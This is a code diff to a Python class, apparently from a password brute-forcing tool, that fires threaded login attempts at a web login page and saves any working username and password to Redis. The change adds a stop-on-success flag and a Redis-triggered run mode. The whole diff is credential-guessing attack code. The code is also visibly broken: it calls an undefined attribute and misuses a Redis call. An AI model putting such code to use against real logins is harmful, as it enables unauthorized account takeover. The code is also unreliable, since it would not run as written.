@@ -41,22 +41,24 @@ class BurpUser:
                 print('[Success] I found it  username - %s | password %s' % (user, password))
                 sp_dict[user] = password
                 len_cont.append(len(r.content))
+                self.found = True
+                self.burp_user_args.hset('burp_user', 'user', user)
+                self.burp_user_args.hset('burp_user', 'password', password)
+               
         except Exception as e:
             print('[Warning] timeout, the thread will be restart after 10s ')
             print(e)
             time.sleep(10)
         self.threadmax.release()
 
-    def run(self):
+    def burp(self):
         th = []
         special_dict = {}
         content = []
-        if len(self.user) < 1:
-            self.finished = True
-            return
         for _ in self.user:
             i = self.user.pop()
             for j in self.password:
+                if self.found: return
                 self.threadmax.acquire()
                 t = threading.Thread(target=self.request_one, args=(i, j, special_dict, content))
                 t.start()
@@ -69,12 +71,17 @@ class BurpUser:
         return self.finished
 
     def redis_connnect(self):
-        self.harvest_redis = redis.Redis(connection_pool=self.savepool)
-
+        self.burp_user_redis = redis.Redis(connection_pool=self.savepool)
+        
+    def run(self):
+        self.action = self.burp_user_redis.get('base', 'burp_user_args')
+        if self.action == 'burp':
+            self.burp()
+            
 
 if __name__ == '__main__':
     save_pool = redis.ConnectionPool(host='127.0.0.1', port=6379, decode_responses=True)
     burp = BurpUser('http://127.0.0.1/index.php', savepool=save_pool)
-    burp.run()
+    
     
 
